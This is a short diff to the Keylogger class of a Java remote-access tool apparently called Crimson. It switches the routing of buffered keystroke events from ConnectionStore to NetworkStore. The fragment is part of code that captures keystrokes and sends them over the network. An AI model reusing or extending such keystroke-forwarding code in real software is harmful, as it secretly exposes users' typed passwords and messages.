@@ -30,6 +30,7 @@ import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
 import com.subterranean_security.crimson.core.store.ConnectionStore;
+import com.subterranean_security.crimson.core.store.NetworkStore;
 import com.subterranean_security.crimson.core.struct.collections.cached.CachedList;
 import com.subterranean_security.crimson.core.util.Native;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
@@ -183,10 +184,10 @@ public final class Keylogger {
 			}
 		} else {
 			while (diskBuffer.size() > 0) {
-				ConnectionStore.route(Message.newBuilder().setEvKevent(diskBuffer.remove(0)));
+				NetworkStore.route(Message.newBuilder().setEvKevent(diskBuffer.remove(0)));
 			}
 			while (buffer.size() > 0) {
-				ConnectionStore.route(Message.newBuilder().setEvKevent(buffer.remove(0)));
+				NetworkStore.route(Message.newBuilder().setEvKevent(buffer.remove(0)));
 			}
 		}
 
